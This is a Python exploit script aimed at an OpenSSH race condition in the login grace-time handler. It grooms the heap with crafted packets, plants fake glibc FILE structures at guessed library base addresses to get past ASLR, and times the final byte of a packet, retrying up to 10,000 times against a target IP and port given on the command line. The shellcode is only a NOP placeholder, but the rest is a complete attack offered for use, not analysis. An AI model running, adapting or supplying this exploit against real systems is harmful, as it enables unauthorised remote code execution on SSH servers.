import socket
import time
import struct
import random
import sys

# Define constants
MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120

# Possible glibc base addresses (for ASLR bypass)
GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

# Shellcode placeholder (replace with actual shellcode)
shellcode = b'\x90\x90\x90\x90'

def setup_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.setblocking(False)
        return sock
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack('!I', packet_len) + struct.pack('!B', packet_type) + data
    try:
        sock.sendall(packet)
    except Exception as e:
        print(f"Failed to send packet: {e}")

def send_ssh_version(sock):
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    try:
        sock.sendall(ssh_version)
    except Exception as e:
        print(f"Failed to send SSH version: {e}")

def receive_ssh_version(sock):
    try:
        response = sock.recv(256)
        print(f"Received SSH version: {response}")
        return response
    except Exception as e:
        print(f"Failed to receive SSH version: {e}")
        return None

def send_kex_init(sock):
    kexinit_payload = b'\x00' * 36
    send_packet(sock, 20, kexinit_payload)

def receive_kex_init(sock):
    try:
        response = sock.recv(1024)
        print(f"Received KEX_INIT ({len(response)} bytes)")
        return response
    except Exception as e:
        print(f"Failed to receive KEX_INIT: {e}")
        return None

def perform_ssh_handshake(sock):
    send_ssh_version(sock)
    if not receive_ssh_version(sock):
        return False
    send_kex_init(sock)
    if not receive_kex_init(sock):
        return False
    return True

def prepare_heap(sock):
    # Packet a: Allocate and free tcache chunks
    for i in range(10):
        tcache_chunk = b'A' * 64
        send_packet(sock, 5, tcache_chunk)

    # Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
    for i in range(27):
        large_hole = b'B' * 8192
        send_packet(sock, 5, large_hole)

        small_hole = b'C' * 320
        send_packet(sock, 5, small_hole)

    # Packet c: Write fake headers, footers, vtable and _codecvt pointers
    for i in range(27):
        fake_data = create_fake_file_structure(4096, GLIBC_BASES[0])
        send_packet(sock, 5, fake_data)

    # Packet d: Ensure holes are in correct malloc bins (send ~256KB string)
    large_string = b'E' * (MAX_PACKET_SIZE - 1)
    send_packet(sock, 5, large_string)

def create_fake_file_structure(size, glibc_base):
    data = bytearray(size)
    
    # Fake FILE structure with necessary fields
    fake_file = struct.pack(
        'QQQQQQQQQQQQQIIi40xQ',
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x61
    )
    data[:len(fake_file)] = fake_file
    
    # Set up fake vtable and _codecvt pointers
    struct.pack_into('Q', data, size - 16, glibc_base + 0x21b740)
    struct.pack_into('Q', data, size - 8, glibc_base + 0x21d7f8)
    
    return bytes(data)

def time_final_packet(sock):
    time_before = measure_response_time(sock, 1)
    time_after = measure_response_time(sock, 2)
    parsing_time = time_after - time_before
    print(f"Estimated parsing time: {parsing_time:.6f} seconds")
    return parsing_time

def measure_response_time(sock, error_type):
    if error_type == 1:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"
    else:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"

    start = time.monotonic()
    send_packet(sock, 50, error_packet)

    try:
        response = sock.recv(1024)
        end = time.monotonic()
        elapsed = end - start
        return elapsed
    except Exception as e:
        print(f"Failed to measure response time: {e}")
        return float('inf')

def create_public_key_packet(size, glibc_base):
    packet = bytearray(size)
    
    offset = 0
    for _ in range(27):
        struct.pack_into('I', packet, offset, 4096)
        offset += 4096
        struct.pack_into('I', packet, offset, 304)
        offset += 304

    packet[:8] = b'ssh-rsa '
    packet[4096 * 13 + 304 * 13:4096 * 13 + 304 * 13 + len(shellcode)] = shellcode
    
    for i in range(27):
        fake_data = create_fake_file_structure(304, glibc_base)
        packet[4096 * (i + 1) + 304 * i:4096 * (i + 1) + 304 * i + 304] = fake_data

    return bytes(packet)

def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = create_public_key_packet(MAX_PACKET_SIZE, glibc_base)

    try:
        sock.sendall(final_packet[:-1])
    except Exception as e:
        print(f"Failed to send final packet: {e}")
        return False

    start = time.monotonic()

    while True:
        current = time.monotonic()
        elapsed = current - start
        if elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001):
            try:
                sock.sendall(final_packet[-1:])
                break
            except Exception as e:
                print(f"Failed to send last byte: {e}")
                return False

    try:
        response = sock.recv(1024)
        print(f"Received response after exploit attempt ({len(response)} bytes)")
        if response and response[:8] != b"SSH-2.0-":
            print("Possible hit on 'large' race window")
            return True
    except Exception as e:
        if isinstance(e, BlockingIOError):
            print("No immediate response from server - possible successful exploitation")
            return True
        else:
            print(f"Error receiving response: {e}")

    return False

def perform_exploit(ip, port):
    success = False
    timing_adjustment = 0

    for glibc_base in GLIBC_BASES:
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")

        for attempt in range(10000):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 10000")

            sock = setup_connection(ip, port)
            if not sock:
                print(f"Failed to establish connection, attempt {attempt}")
                continue

            if not perform_ssh_handshake(sock):
                print(f"SSH handshake failed, attempt {attempt}")
                sock.close()
                continue

            prepare_heap(sock)
            parsing_time = time_final_packet(sock) + timing_adjustment

            if attempt_race_condition(sock, parsing_time, glibc_base):
                print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                success = True
                break
            else:
                timing_adjustment += 0.00001

            sock.close()
            time.sleep(0.1)

        if success:
            break

    return success

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    success = perform_exploit(ip, port)
    sys.exit(0 if success else 1)
